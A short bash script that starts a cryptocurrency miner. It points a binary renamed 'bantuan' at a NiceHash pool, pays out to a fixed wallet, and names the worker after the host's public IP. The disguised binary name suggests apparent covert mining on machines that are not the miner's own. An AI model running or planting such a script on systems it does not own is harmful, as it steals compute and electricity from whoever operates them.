#!/bin/bash
POOL=stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353
WALLET=3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )

chmod +x bantuan
./bantuan --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
